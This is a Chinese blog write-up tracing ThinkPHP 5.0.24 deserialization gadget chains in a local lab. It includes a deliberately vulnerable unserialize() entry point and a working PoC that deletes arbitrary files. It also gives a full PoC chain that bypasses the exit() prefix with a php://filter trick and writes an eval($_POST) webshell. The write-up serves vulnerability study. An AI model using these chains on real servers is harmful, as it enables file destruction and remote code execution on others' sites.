前言：
下载地址：下载：ThinkPHP5.0.24核心版 - ThinkPHP框架

利用的phpstudy+PhpStorm搭建的debug环境。

首先在app\index\controller下的index.php设置一个传入点。

index.php

<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        echo 'welcome to tp5024';
        if(isset($_GET['feng'])){
            $feng = base64_decode($_GET['feng']);
            unserialize($feng);
        }
    }
}
一开始接触，感觉最好找一个链子，debug一下，一步一步跟，不然直接自己找的话会看的头疼。

任意删除文件
在Windows.php的__destruct中。



 跟进一下removeFiles。

private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
 大概意思是对files遍历，将file赋值给filename，跟一下file。



发现file可控，然后看一下file在哪个类里。



发现Windows继承了 Pipes。

poc
<?php

namespace think\process\pipes;

class Pipes{}

class Windows extends Pipes
{
    private $files = ['D:\phpstudy_pro\WWW\tp5024\1.txt'];
}

echo base64_encode(serialize(new Windows()));
下个断点，很容易看清其走向。



 

 

 然后便会发现1.txt已经被删除。

恶意文件上传
file_exists搭配对象可以跳到__toString。


 在Model.php的__toString中，进入tojson然后跟进，到toArray()。

    public function __toString()
    {
        return $this->toJson();
    }
     
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }


 三处存在__call漏洞可能
$item[$key] = $relation->append([$attr])->toArray();
$bindAttr = $modelRelation->getBindAttr();
$item[$key] = $value ? $value->getAttr($attr) : null;
找一下可控变量，$value可控，往上边跟一下。

$value = $this->getRelationData($modelRelation);
$value是在getRelationData中返还，跟进看一下。



$value = $this->parent;
看一下parent是否可控，发现可控，看一下if条件。



三个条件：

$this->parent
!$modelRelation->isSelfRelation()
get_class($modelRelation->getModel()) == get_class($this->parent)
第一个：parent可控。

第二个：



 可控

第三个：跟进getModel函数



 query可控，然后又调用了getModel,再跟进，在thinkphp\library\think\db\Query.php中发现getModel方法。



 返还model，参数可控。

绕过getRelationData方法中的三个条件
三个条件都可以满足，可以进入if条件。

再看下边代码中的$modelRelation参数。

$value = $this->getRelationData($modelRelation);


$modelRelation被relation控制，relation被Loader::parseName控制，跟一下。

发现其只是一个大小写变化，不会改变name参数，因为$name可控，所以$relation可控。

if (method_exists($this, $relation)) {
               $modelRelation = $this->$relation();
               $value         = $this->getRelationData($modelRelation);
想进入if语句，需要满足这个method_exists，则需要将$relation设定为$this中存在的方法，relation可以控制，this指的是Model这个类，看一起其中哪一个方法返回参数可以直接控制。



发现了getError方法，且返回的error参数可以直接控制。

error参数的值刚好直接可以返还给$modelRelation。

$modelRelation = $this->$relation();
这里的relation()可以直接当作getError()，返还error的值，所以$modelRelation=$error

想进入改语句，需要先解决前边几个if条件。

if (method_exists($modelRelation, 'getBindAttr'))
$bindAttr = $modelRelation->getBindAttr()
if ($bindAttr)
下边的一个if语句刚好就是modelRelation的getBindAttr方法返回的值，跟一下getBindAttr。

在OneToOne.php发现该方法，并且bindAttr可控，第二个if条件也可以过了。

    public function getBindAttr()
    {
        return $this->bindAttr;
    }
OneToOne是一个抽象类，且OneToOne类是Relation类的派生类，然后找一下谁继承了OneToOne，找到了class HasOne extends OneToOne，HasOne继承了OneToOne。可以直接让让$modelRelation的值为HasOne，可以满足getRelationData方法中if第三个条件的getModel方法，并且其中也有bindAttr可控。

然后进入if (isset($this->data[$key]))的else条件便可以调用__call方法。

调用__call之后的操作
public function __call($method, $args)
    {
        if (in_array($method, $this->styles)) {
            array_unshift($args, $method);
            return call_user_func_array([$this, 'block'], $args);
        }

        if ($this->handle && method_exists($this->handle, $method)) {
            return call_user_func_array([$this->handle, $method], $args);
        } else {
            throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
        }
    }

}

call函数中in_array的$method, $this->styles两个参数可控，可以进入if语句，然后可以实现block方法，跟进一下block。



直接到了write方法，发现handel可控，找一个存在可控write方法的类利用。 



 $this->handler可控，再找一下可以利用的set方法。

在thinkphp\library\think\cache\driver\File.php中发现set且存在一个写入文件的操作。

public function set($name, $value, $expire = null)
    {
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        if ($expire instanceof \DateTime) {
            $expire = $expire->getTimestamp() - time();
        }
        $filename = $this->getCacheKey($name, true);
        if ($this->tag && !is_file($filename)) {
            $first = true;
        }
        $data = serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            isset($first) && $this->setTagItem($filename);
            clearstatcache();
            return true;
        } else {
            return false;
        }
    }

首先看一下filename和data是否可控。

$filename = $this->getCacheKey($name, true);
filename由getCacheKey决定，跟一下getCacheKey。

$filename = $this->options['path'] . $name . '.php';
filename类型后缀为php，前边的options['path']和name可控。



 很明显可以看出$data=$value=$sessData=$newline=ture,所以data不可控，直接这样写入文件行不通，但在后边的setTagItem方法中，再一次调用了set方法。

    protected function setTagItem($name)
    {
        if ($this->tag) {
            $key       = 'tag_' . md5($this->tag);
            $this->tag = null;
            if ($this->has($key)) {
                $value   = explode(',', $this->get($key));
                $value[] = $name;
                $value   = implode(',', array_unique($value));
            } else {
                $value = $name;
            }
            $this->set($key, $value, 0);
        }
    }

此时$key和$value均可控。

利用php为协议来绕过exit();?>
利用php://filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。<?php exit;在经过rot13编码后会变成<?cuc rkvg();，前提是PHP不开启short_open_tag。

但这次遇到的和平常的不太一样，本地尝试一下如何才能绕过。

<?php
$filename=$_GET['filename'];
$content1=$_GET['content'];
$data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $content1;
file_put_contents($filename,$data);
?>
当我前边加一个a时。



 当加到三个a时，发现成功。



 

 

所以要使用伪协议绕过时，需要前方加入字符来使其可以进行base64解码。

第二次file_put_contents($filename, $data);时的filename和data数据基本一样，所以我又本地试了一下。

<?php
$filename=$_GET['filename'];
$content=$filename;
$data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $content;
echo $data;
file_put_contents($filename,$data);
?>
这次需要用到php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../1.php，之前的payload无法成功。

php的php://filter/convert.iconv.UTF8.UTF-7这种filter可以用来转换编码，和linux系统中的iconv命令一致，可以用来转xml进行xxe-waf绕过。

成功后便可以开始写exp，我写了好多次才成功。

首先先把进入tostring那一部分写出来。

<?php

namespace think\process\pipes;
abstract class Pipes
{
}

use think\model\Pivot;

class Windows extends Pipes
{
    private $files = [];

    function __construct()
    {
        $this->files = [];
    }
}

给files赋值成对象，tostring在Model中，但Model是一个抽象类，无法直接实例化，找一下Model的继承类，然后回头看一下Model中都需要改哪一些参数。

首先是append的key最后要赋值给$relation，然后还会将relation当作方法利用返回$modelRelation所以要让append = ['getError'],紧接着就是判断$modelRelation中是否有getBindAttr方法。我们做的操作是给getError中返还的error参数赋值成HasOne()对象，让$modelRelation=new HasOne()，因为HasOne继承了抽象类OneToOne，且其中存在可控的getBindAttr方法及参数bindAttr。

然后就到了给$value赋值，value是跳到call的关键点，到getRelationData，让parent=new Output(),Relation抽象类中的$selfRelation=false，此时便可使value等于new Output()。

$bindAttr = $modelRelation->getBindAttr();
 getBindAttr方法是OneToOne中的，返还的是bindAttr，这里给bindAttr赋值=["no","1"],可以绕过if (isset($this->data[$key]))，直接进入else，然后再进入Output中的call方法。

对call方法分析，首先是进入第一个if条件，in_array($method, $this->styles)返回真，因为method是从Mode中的$attr直接赋值过来的，所以使method相等in_array即可返回真，$attr是$bindAttr的键值，调试一下。



 发现method为getAttr，所以令$this->styles='getAttr'即可。

后边就是绕过死亡函数，上边已经讲过了，就不再说了。

poc
<?php

namespace think\process\pipes;
abstract class Pipes
{
}

use think\model\Pivot;

class Windows extends Pipes
{
    private $files = [];

    function __construct()
    {
        $this->files = [new Pivot()];
    }
}

namespace think;
use think\model\relation\HasOne;
use think\console\Output;
use think\db\Query;
abstract class Model{
    protected $append = [];
    protected $error;
    public $parent;
    protected $query;
    function __construct()
    {
        $this->append=['getError'];
        $this->error=new HasOne();
        $this->query=new Query();
        $this->parent=new Output();
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model{
}

namespace think\model\relation;
use think\model\Relation;

abstract class OneToOne extends Relation{ # OneToOne抽象类
    function __construct(){
        parent::__construct();
    }
}
// HasOne
class HasOne extends OneToOne{
    protected $bindAttr = [];
    function __construct(){
        parent::__construct();
        $this->bindAttr = ["no","123"];
    }
}
namespace think\model;
use think\db\Query;
abstract class Relation{
    protected $selfRelation;
    protected $query;
    function __construct(){
        $this->selfRelation = false;
        $this->query= new Query();
    }
}
namespace think\db;
use think\console\Output;
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output(); //让其与parent一直，通过getRelationData的第三个条件
    }
}
namespace think\console;
use think\session\driver\Memcache;
class Output{
    private $handle = null;
    protected $styles = [];
    function __construct()
    {
        $this->styles = ['getAttr'];
        $this->handle=new Memcache();
    }

}

namespace think\session\driver;
use think\cache\driver\File;
class Memcache
{
    protected $handler = null;

    function __construct()
    {
        $this->handler = new File();
    }
}
namespace think\cache\driver;
class File
{
    protected $options = [];
    protected $tag;

    function __construct()
    {
        $this->options = [
            'expire' => 0,
            'cache_subdir' => false,
            'prefix' => '',
            'path'=>'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydmZW5nJ10pOz8+IA==/../feng.php',
            'data_compress' => false,
        ];
        $this->tag = true;
    }
     
    public function Getfilename()
    {
        $name = md5('tag_' . md5($this->tag));
        $filename = $this->options['path'];
        $pos = strpos($filename, "/../");
        $filename = urlencode(substr($filename, $pos + strlen("/../")));
        return $filename . $name . ".php";
    }
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
echo "\n";
$a = new File();
echo $a->Getfilename();

 传参后直接访问文件，文件名就是exp中打印出来的文件名



另一个rce链子因为环境问题一直没复现成功，等之后再加吧。

感觉自己太菜了，就这么一点代码，跟了一整天才搞完。

参考文章：

(7条消息) Thinkphp 5.0.24反序列化漏洞导致RCE分析_浔阳江头夜送客丶的博客-CSDN博客_thinkphp v5.0.24 漏洞

(7条消息) thinkphp5.0.24反序列化链子分析_XiLitter的博客-CSDN博客_thinkphp v5.0.24